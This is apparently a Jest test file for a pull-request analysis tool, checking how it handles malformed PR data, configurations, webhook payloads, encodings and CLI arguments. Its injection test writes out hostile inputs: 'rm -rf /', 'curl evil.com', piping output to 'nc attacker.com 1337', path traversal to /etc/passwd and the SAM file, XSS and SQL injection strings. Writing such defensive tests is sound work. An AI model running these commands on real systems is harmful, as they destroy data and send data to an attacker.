/* eslint-disable @typescript-eslint/no-explicit-any */
import { PRAnalyzer } from '../../src/pr-analyzer';
import { EventMapper } from '../../src/event-mapper';
import { CLI } from '../../src/cli';
import { createMockOctokit } from '../performance/test-utilities';

describe('Malformed Data Handling Tests', () => {
  let mockOctokit: any;

  beforeEach(() => {
    mockOctokit = createMockOctokit();
    jest.clearAllMocks();
  });

  describe('Malformed PR Data', () => {
    test('should handle PR with missing critical fields', async () => {
      console.log('Testing PR with missing critical fields...');

      const incompleteResponses = [
        // Missing title
        {
          data: {
            id: 123,
            number: 1,
            // title missing
            body: 'Test body',
            user: { login: 'test-user' },
            head: { sha: 'abc123', ref: 'feature' },
            base: { sha: 'def456', ref: 'main' },
            draft: false,
            additions: 10,
            deletions: 5,
            changed_files: 2,
          },
        },
        // Missing user
        {
          data: {
            id: 123,
            number: 1,
            title: 'Test PR',
            body: 'Test body',
            // user missing
            head: { sha: 'abc123', ref: 'feature' },
            base: { sha: 'def456', ref: 'main' },
            draft: false,
            additions: 10,
            deletions: 5,
            changed_files: 2,
          },
        },
        // Missing head/base refs
        {
          data: {
            id: 123,
            number: 1,
            title: 'Test PR',
            body: 'Test body',
            user: { login: 'test-user' },
            // head and base missing
            draft: false,
            additions: 10,
            deletions: 5,
            changed_files: 2,
          },
        },
      ];

      const analyzer = new PRAnalyzer(mockOctokit);

      for (let i = 0; i < incompleteResponses.length; i++) {
        console.log(`  Testing incomplete response ${i + 1}...`);

        mockOctokit.rest.pulls.get.mockResolvedValueOnce(incompleteResponses[i]);
        mockOctokit.rest.pulls.listFiles.mockResolvedValueOnce({ data: [] });

        try {
          const prInfo = await analyzer.fetchPRDiff('test-owner', 'test-repo', 1);

          console.log(`    PR Info received:`, {
            title: prInfo.title || 'MISSING',
            author: prInfo.author || 'MISSING',
            base: prInfo.base || 'MISSING',
            head: prInfo.head || 'MISSING',
          });

          // Should handle missing fields gracefully with defaults or undefined
          expect(prInfo).toBeDefined();
          expect(typeof prInfo.title === 'string' || prInfo.title === undefined).toBe(true);
          expect(typeof prInfo.author === 'string' || prInfo.author === undefined).toBe(true);
          expect(typeof prInfo.base === 'string' || prInfo.base === undefined).toBe(true);
          expect(typeof prInfo.head === 'string' || prInfo.head === undefined).toBe(true);
        } catch (error: any) {
          console.log(`    Expected error for incomplete data: ${error.message}`);
          if (error.message) {
            expect(
              error.message.includes('missing') ||
                error.message.includes('required') ||
                error.message.includes('invalid') ||
                error.message.includes('Cannot read properties')
            ).toBe(true);
          } else {
            // If no error message, the incomplete data was handled gracefully
            expect(error).toBeDefined();
          }
        }
      }
    });

    test('should handle PR with invalid data types', async () => {
      console.log('Testing PR with invalid data types...');

      const invalidTypeResponses = [
        // Number fields as strings
        {
          data: {
            id: '123', // Should be number
            number: 'one', // Should be number
            title: 123, // Should be string
            body: true, // Should be string
            user: { login: 456 }, // Should be string
            head: { sha: 'abc123', ref: 'feature' },
            base: { sha: 'def456', ref: 'main' },
            draft: 'false', // Should be boolean
            additions: 'ten', // Should be number
            deletions: null, // Should be number
            changed_files: [], // Should be number
          },
        },
        // Nested object issues
        {
          data: {
            id: 123,
            number: 1,
            title: 'Test PR',
            body: 'Test body',
            user: 'not-an-object', // Should be object
            head: 'invalid-head', // Should be object
            base: { sha: null, ref: undefined }, // Invalid nested values
            draft: false,
            additions: 10,
            deletions: 5,
            changed_files: 2,
          },
        },
      ];

      const analyzer = new PRAnalyzer(mockOctokit);

      for (let i = 0; i < invalidTypeResponses.length; i++) {
        console.log(`  Testing invalid types response ${i + 1}...`);

        mockOctokit.rest.pulls.get.mockResolvedValueOnce(invalidTypeResponses[i]);
        mockOctokit.rest.pulls.listFiles.mockResolvedValueOnce({ data: [] });

        try {
          const prInfo = await analyzer.fetchPRDiff('test-owner', 'test-repo', 1);

          console.log(`    Data types handled:`, {
            titleType: typeof prInfo.title,
            authorType: typeof prInfo.author,
            numberType: typeof prInfo.number,
            additionsType: typeof prInfo.totalAdditions,
          });

          // Should convert or handle invalid types gracefully
          expect(prInfo).toBeDefined();
        } catch (error: any) {
          console.log(`    Type conversion error: ${error.message}`);
          // Should provide clear error about type issues
          expect(error.message).toBeDefined();
        }
      }
    });

    test('should handle malformed file diff data', async () => {
      console.log('Testing malformed file diff data...');

      const malformedFileResponses = [
        // Files with missing fields
        {
          data: [
            {
              // filename missing
              additions: 5,
              deletions: 2,
              changes: 7,
              status: 'modified',
              patch: '@@ -1,3 +1,3 @@\n test',
            },
            {
              filename: 'test.js',
              // additions/deletions missing
              changes: 7,
              status: 'modified',
              patch: '@@ -1,3 +1,3 @@\n test',
            },
          ],
        },
        // Files with invalid patch data
        {
          data: [
            {
              filename: 'test1.js',
              additions: 'five', // Should be number
              deletions: null, // Should be number
              changes: [], // Should be number
              status: 'unknown-status', // Invalid status
              patch: 123, // Should be string
            },
            {
              filename: '', // Empty filename
              additions: -5, // Negative additions
              deletions: -2, // Negative deletions
              changes: Infinity, // Invalid number
              status: null, // Null status
              patch: undefined, // Undefined patch
            },
          ],
        },
        // Completely malformed file structure
        {
          data: [
            'not-an-object', // Should be object
            null, // Null file
            { invalid: 'structure' }, // Missing required fields
          ],
        },
      ];

      const analyzer = new PRAnalyzer(mockOctokit);

      // Mock PR response
      mockOctokit.rest.pulls.get.mockResolvedValue({
        data: {
          id: 123,
          number: 1,
          title: 'Test PR',
          body: 'Test body',
          user: { login: 'test-user' },
          head: { sha: 'abc123', ref: 'feature' },
          base: { sha: 'def456', ref: 'main' },
          draft: false,
          additions: 10,
          deletions: 5,
          changed_files: 2,
        },
      });

      for (let i = 0; i < malformedFileResponses.length; i++) {
        console.log(`  Testing malformed files response ${i + 1}...`);

        mockOctokit.rest.pulls.listFiles.mockResolvedValueOnce(malformedFileResponses[i]);

        try {
          const prInfo = await analyzer.fetchPRDiff('test-owner', 'test-repo', 1);

          console.log(`    Files processed: ${prInfo.files.length}`);
          console.log(
            `    Valid files:`,
            prInfo.files.map(f => ({
              filename: f.filename,
              hasValidAdditions: typeof f.additions === 'number' && f.additions >= 0,
              hasValidPatch: typeof f.patch === 'string',
            }))
          );

          // Should filter out or fix malformed files
          expect(prInfo.files).toBeDefined();
          expect(Array.isArray(prInfo.files)).toBe(true);

          // Valid files should have proper structure
          prInfo.files.forEach(file => {
            expect(typeof file.filename).toBe('string');
            expect(file.filename.length).toBeGreaterThan(0);
          });
        } catch (error: any) {
          console.log(`    Malformed file data error: ${error.message}`);
          expect(error.message).toBeDefined();
        }
      }
    });
  });

  describe('Malformed Configuration Data', () => {
    test('should handle configuration with invalid structure', async () => {
      console.log('Testing configuration with invalid structure...');

      const invalidConfigs = [
        // Invalid checks structure
        {
          version: '1.0',
          checks: 'not-an-object', // Should be object
          output: { pr_comment: { format: 'summary', group_by: 'check', collapse: true } },
        },
        // Invalid check definitions
        {
          version: '1.0',
          checks: {
            'invalid-check-1': null, // Should be object
            'invalid-check-2': 'string-instead-of-object', // Should be object
            'invalid-check-3': { type: 'unknown-type' }, // Invalid type
            'invalid-check-4': { type: 'ai' }, // Missing required fields
          },
          output: { pr_comment: { format: 'summary', group_by: 'check', collapse: true } },
        },
        // Invalid trigger patterns
        {
          version: '1.0',
          checks: {
            'trigger-test': {
              type: 'ai',
              prompt: 'Test prompt',
              on: ['pr_opened'],
              triggers: 'not-an-array', // Should be array
            },
          },
          output: { pr_comment: { format: 'summary', group_by: 'check', collapse: true } },
        },
      ];

      for (let i = 0; i < invalidConfigs.length; i++) {
        console.log(`  Testing invalid config ${i + 1}...`);

        try {
          const eventMapper = new EventMapper(invalidConfigs[i] as any);

          const testEvent = {
            event_name: 'pull_request',
            action: 'opened',
            repository: { owner: { login: 'test' }, name: 'repo' },
            pull_request: {
              number: 1,
              state: 'open',
              head: { sha: 'abc', ref: 'feature' },
              base: { sha: 'def', ref: 'main' },
              draft: false,
            },
          };

          const execution = eventMapper.mapEventToExecution(testEvent);

          console.log(
            `    Invalid config handled: shouldExecute=${execution.shouldExecute}, checks=${execution.checksToRun.length}`
          );

          // Should handle invalid config gracefully
          expect(execution).toBeDefined();
          expect(typeof execution.shouldExecute).toBe('boolean');
          expect(Array.isArray(execution.checksToRun)).toBe(true);
        } catch (error: any) {
          console.log(`    Configuration error: ${error.message}`);
          // Should provide helpful error messages
          expect(error.message).toBeDefined();
          expect(error.message.length).toBeGreaterThan(5);
        }
      }
    });

    test('should handle configuration with circular references', async () => {
      console.log('Testing configuration with circular references...');

      // Create circular reference
      const circularConfig: any = {
        version: '1.0',
        checks: {},
        output: { pr_comment: { format: 'summary', group_by: 'check', collapse: true } },
      };

      circularConfig.checks.circularCheck = {
        type: 'ai',
        prompt: 'Test',
        on: ['pr_opened'],
        selfReference: circularConfig, // Circular reference
      };

      try {
        const eventMapper = new EventMapper(circularConfig);

        const testEvent = {
          event_name: 'pull_request',
          action: 'opened',
          repository: { owner: { login: 'test' }, name: 'repo' },
          pull_request: {
            number: 1,
            state: 'open',
            head: { sha: 'abc', ref: 'feature' },
            base: { sha: 'def', ref: 'main' },
            draft: false,
          },
        };

        const execution = eventMapper.mapEventToExecution(testEvent);

        console.log(`  Circular reference handled: ${execution.checksToRun.length} checks`);
        expect(execution).toBeDefined();
      } catch (error: any) {
        console.log(`  Circular reference error: ${error.message}`);
        // Should detect and handle circular references
        expect(error.message.includes('circular') || error.message.includes('reference')).toBe(
          true
        );
      }
    });
  });

  describe('Malformed CLI Input', () => {
    test('should handle invalid CLI arguments gracefully', async () => {
      console.log('Testing invalid CLI arguments handling...');

      const cli = new CLI();

      const invalidArguments = [
        // Unknown options
        ['--unknown-option', 'value'],
        ['--check', 'invalid-check-type'],
        ['--output', 'invalid-format'],
        ['--config', '/nonexistent/path'],
        // Malformed syntax
        ['--check'], // Missing value
        ['--output'], // Missing value
        ['--config'], // Missing value
        // Invalid combinations
        ['--help', '--check', 'all'], // Help with other options
        ['--version', '--output', 'json'], // Version with other options
        // Special characters and encoding
        ['--check', 'per\x00formance'], // Null byte
        ['--output', 'summ\x01ary'], // Control character
        ['--config', 'config.yaml\n--check all'], // Injection attempt
      ];

      for (let i = 0; i < invalidArguments.length; i++) {
        const args = invalidArguments[i];
        console.log(`  Testing invalid args: ${args.join(' ')}`);

        try {
          const options = cli.parseArgs(args);
          console.log(`    Parsed successfully: ${JSON.stringify(options)}`);

          // If parsing succeeded, validate the results
          if (options.checks) {
            expect(Array.isArray(options.checks)).toBe(true);
            // Should filter out invalid check types
            options.checks.forEach(check => {
              expect(['performance', 'architecture', 'security', 'style', 'all']).toContain(check);
            });
          }

          if (options.output) {
            expect(['table', 'json', 'markdown', 'sarif']).toContain(options.output);
          }
        } catch (error: any) {
          console.log(`    Expected error: ${error.message}`);

          // Should provide helpful error messages
          expect(error.message).toBeDefined();
          expect(error.message.length).toBeGreaterThan(5);

          // Should not contain sensitive information or stack traces in user-facing errors
          expect(error.message).not.toContain('at ');
          expect(error.message).not.toContain('stack');
        }
      }
    });

    test('should handle CLI argument injection attempts', async () => {
      console.log('Testing CLI argument injection prevention...');

      const cli = new CLI();

      const injectionAttempts = [
        // Command injection
        ['--config', 'config.yaml; rm -rf /'],
        ['--check', 'all && curl evil.com'],
        ['--output', 'json | nc attacker.com 1337'],
        // Path traversal
        ['--config', '../../../etc/passwd'],
        ['--config', '..\\..\\windows\\system32\\config\\sam'],
        // Script injection
        ['--config', '<script>alert("xss")</script>'],
        ['--check', '${eval("evil")}'],
        // SQL injection patterns (even though not applicable)
        ['--output', "'; DROP TABLE users; --"],
      ];

      for (let i = 0; i < injectionAttempts.length; i++) {
        const args = injectionAttempts[i];
        console.log(`  Testing injection attempt: ${args.join(' ')}`);

        try {
          const options = cli.parseArgs(args);

          // If parsing succeeded, ensure values are sanitized
          if (options.configPath) {
            console.log(`    Config path: ${options.configPath}`);
            // Should not contain dangerous characters
            expect(options.configPath).not.toContain(';');
            expect(options.configPath).not.toContain('&&');
            expect(options.configPath).not.toContain('|');
            expect(options.configPath).not.toContain('<script>');
          }

          if (options.checks && options.checks.length > 0) {
            options.checks.forEach(check => {
              console.log(`    Check: ${check}`);
              expect(['performance', 'architecture', 'security', 'style', 'all']).toContain(check);
            });
          }

          if (options.output) {
            console.log(`    Output: ${options.output}`);
            expect(['table', 'json', 'markdown', 'sarif']).toContain(options.output);
          }
        } catch (error: any) {
          console.log(`    Injection blocked: ${error.message}`);
          // Should block injection attempts
          expect(error.message).toBeDefined();
        }
      }
    });
  });

  describe('Malformed GitHub Event Data', () => {
    test('should handle corrupted webhook payloads', async () => {
      console.log('Testing corrupted webhook payload handling...');

      const corruptedPayloads = [
        // Missing event_name
        {
          repository: { owner: { login: 'test' }, name: 'repo' },
          pull_request: { number: 1 },
        },
        // Invalid repository structure
        {
          event_name: 'pull_request',
          repository: 'not-an-object',
          pull_request: { number: 1 },
        },
        // Missing critical PR fields
        {
          event_name: 'pull_request',
          repository: { owner: { login: 'test' }, name: 'repo' },
          pull_request: {}, // Empty PR object
        },
        // Invalid data types
        {
          event_name: 123, // Should be string
          repository: { owner: { login: 456 }, name: true }, // Invalid types
          pull_request: { number: 'one', state: 123, draft: 'yes' }, // Invalid types
        },
      ];

      const testConfig = {
        version: '1.0',
        checks: {
          'test-check': {
            type: 'ai' as const,
            prompt: 'Test',
            on: ['pr_opened' as const],
          },
        },
        output: {
          pr_comment: { format: 'summary' as const, group_by: 'check' as const, collapse: true },
        },
      };

      const eventMapper = new EventMapper(testConfig);

      for (let i = 0; i < corruptedPayloads.length; i++) {
        const payload = corruptedPayloads[i];
        console.log(`  Testing corrupted payload ${i + 1}...`);

        try {
          const execution = eventMapper.mapEventToExecution(payload as any);

          console.log(`    Corrupted payload handled: shouldExecute=${execution.shouldExecute}`);

          // Should handle corrupted payloads gracefully
          expect(execution).toBeDefined();
          expect(typeof execution.shouldExecute).toBe('boolean');
        } catch (error: any) {
          console.log(`    Payload corruption error: ${error.message}`);
          // Should provide clear error for corrupted payloads
          expect(error.message).toBeDefined();
          expect(
            error.message.includes('invalid') ||
              error.message.includes('missing') ||
              error.message.includes('corrupted') ||
              error.message.includes('Invalid or corrupted event payload')
          ).toBe(true);
        }
      }
    });

    test('should handle webhook payload size limits', async () => {
      console.log('Testing webhook payload size limit handling...');

      // Create extremely large payload
      const largePayload = {
        event_name: 'pull_request',
        action: 'opened',
        repository: { owner: { login: 'test' }, name: 'repo' },
        pull_request: {
          number: 1,
          state: 'open',
          head: { sha: 'abc', ref: 'feature' },
          base: { sha: 'def', ref: 'main' },
          draft: false,
          title: 'x'.repeat(10000), // 10KB title
          body: 'y'.repeat(100000), // 100KB body
        },
        // Add large arrays
        commits: Array(1000)
          .fill(0)
          .map((_, i) => ({
            sha: `commit-${i}`,
            message: 'z'.repeat(1000), // 1KB per commit message
          })),
      };

      const testConfig = {
        version: '1.0',
        checks: {
          'large-payload-test': {
            type: 'ai' as const,
            prompt: 'Test large payload',
            on: ['pr_opened' as const],
          },
        },
        output: {
          pr_comment: { format: 'summary' as const, group_by: 'check' as const, collapse: true },
        },
      };

      try {
        const eventMapper = new EventMapper(testConfig);
        const execution = eventMapper.mapEventToExecution(largePayload);

        console.log(`  Large payload handled: ${JSON.stringify(execution).length} bytes`);

        // Should handle large payloads without issues
        expect(execution).toBeDefined();
        expect(execution.shouldExecute).toBeDefined();
      } catch (error: any) {
        console.log(`  Large payload error: ${error.message}`);
        // Should handle large payloads gracefully or provide size limit error
        expect(error.message).toBeDefined();
      }
    });
  });

  describe('Unicode and Character Encoding Issues', () => {
    test('should handle various character encodings in PR data', async () => {
      console.log('Testing character encoding handling...');

      const encodingTestCases = [
        {
          name: 'Unicode characters',
          data: {
            title: '🚀 Add support for émojis and spëcial characters',
            body: 'Testing unicode: ñ, ü, ç, 中文, العربية, русский',
            filename: 'src/tëst-ñame.js',
            patch: '@@ -1,1 +1,1 @@\n-console.log("old");\n+console.log("new 中文");',
          },
        },
        {
          name: 'Control characters',
          data: {
            title: 'Test\x00with\x01control\x02characters',
            body: 'Body with\ttabs\nand\rnewlines',
            filename: 'file\x00with\x01nulls.js',
            patch: '@@ -1,1 +1,1 @@\n-old\x00line\n+new\x01line',
          },
        },
        {
          name: 'High Unicode code points',
          data: {
            title: 'Test with high Unicode: 𝔘𝔫𝔦𝔠𝔬𝔡𝔢 💩 🦄',
            body: 'Mathematical Alphanumeric Symbols: 𝒜𝒷𝒸𝒹ℯ𝒻ℊ',
            filename: '𝔲𝔫𝔦𝔠𝔬𝔡𝔢-𝔣𝔦𝔩𝔢.js',
            patch: '@@ -1,1 +1,1 @@\n-// 𝔬𝔩𝔡\n+// 𝔫𝔢𝔴',
          },
        },
        {
          name: 'Mixed encodings',
          data: {
            title: 'Mixed: ASCII + UTF-8 + émojis 🌍',
            body: 'Test\u0000null\u0001soh\u0002stx\u001Fus',
            filename: 'mixed-encoding-тест-文件.js',
            patch: '@@ -1,1 +1,1 @@\n-console.log("tëst");\n+console.log("tëst 🎉");',
          },
        },
      ];

      const analyzer = new PRAnalyzer(mockOctokit);

      for (const testCase of encodingTestCases) {
        console.log(`  Testing ${testCase.name}...`);

        // Mock PR with encoding test data
        mockOctokit.rest.pulls.get.mockResolvedValueOnce({
          data: {
            id: 123,
            number: 1,
            title: testCase.data.title,
            body: testCase.data.body,
            user: { login: 'test-user' },
            head: { sha: 'abc123', ref: 'feature' },
            base: { sha: 'def456', ref: 'main' },
            draft: false,
            additions: 1,
            deletions: 1,
            changed_files: 1,
          },
        });

        mockOctokit.rest.pulls.listFiles.mockResolvedValueOnce({
          data: [
            {
              filename: testCase.data.filename,
              additions: 1,
              deletions: 1,
              changes: 2,
              status: 'modified',
              patch: testCase.data.patch,
            },
          ],
        });

        try {
          const prInfo = await analyzer.fetchPRDiff('test-owner', 'test-repo', 1);

          console.log(`    Encoding handled successfully:`);
          console.log(`      Title length: ${prInfo.title.length}`);
          console.log(`      Body length: ${prInfo.body.length}`);
          console.log(`      Files: ${prInfo.files.length}`);
          console.log(`      First filename: ${prInfo.files[0]?.filename.substring(0, 50)}...`);

          // Should handle various encodings without corruption
          expect(prInfo.title).toBeDefined();
          expect(prInfo.body).toBeDefined();
          expect(prInfo.files.length).toBe(1);
          expect(prInfo.files[0].filename).toBeDefined();

          // Should preserve Unicode characters (may strip control characters)
          if (testCase.name === 'Unicode characters') {
            expect(prInfo.title).toContain('🚀');
            expect(prInfo.body).toContain('中文');
          }
        } catch (error: any) {
          console.log(`    Encoding error: ${error.message}`);
          // Some encoding issues might cause errors, which is acceptable
          expect(error.message).toBeDefined();
        }
      }
    });

    test('should handle invalid UTF-8 sequences', async () => {
      console.log('Testing invalid UTF-8 sequence handling...');

      // Note: In JavaScript, invalid UTF-8 is often handled at a lower level
      // These tests simulate what might happen with corrupted text data

      const invalidUtf8Cases = [
        {
          name: 'Lone surrogates',
          title: 'Test with lone surrogate: \uD800 \uDC00',
          body: 'High surrogate without low: \uD800, Low surrogate without high: \uDC00',
        },
        {
          name: 'Overlong sequences simulation',
          title: 'Simulated overlong encoding issues',
          body: 'This simulates what might happen with overlong UTF-8 sequences',
        },
        {
          name: 'Replacement characters',
          title: 'Test with replacement chars: \uFFFD \uFFFD \uFFFD',
          body: 'Multiple replacement characters: \uFFFD\uFFFD\uFFFD',
        },
      ];

      const analyzer = new PRAnalyzer(mockOctokit);

      for (const testCase of invalidUtf8Cases) {
        console.log(`  Testing ${testCase.name}...`);

        mockOctokit.rest.pulls.get.mockResolvedValueOnce({
          data: {
            id: 123,
            number: 1,
            title: testCase.title,
            body: testCase.body,
            user: { login: 'test-user' },
            head: { sha: 'abc123', ref: 'feature' },
            base: { sha: 'def456', ref: 'main' },
            draft: false,
            additions: 1,
            deletions: 0,
            changed_files: 1,
          },
        });

        mockOctokit.rest.pulls.listFiles.mockResolvedValueOnce({ data: [] });

        try {
          const prInfo = await analyzer.fetchPRDiff('test-owner', 'test-repo', 1);

          console.log(`    Invalid UTF-8 handled:`);
          console.log(`      Title: ${prInfo.title.substring(0, 50)}...`);
          console.log(`      Body: ${prInfo.body.substring(0, 50)}...`);

          // Should handle invalid UTF-8 gracefully
          expect(prInfo.title).toBeDefined();
          expect(prInfo.body).toBeDefined();

          // Check if replacement characters are handled appropriately
          if (testCase.name === 'Replacement characters') {
            expect(prInfo.title).toContain('\uFFFD');
          }
        } catch (error: any) {
          console.log(`    UTF-8 error: ${error.message}`);
          expect(error.message).toBeDefined();
        }
      }
    });
  });
});
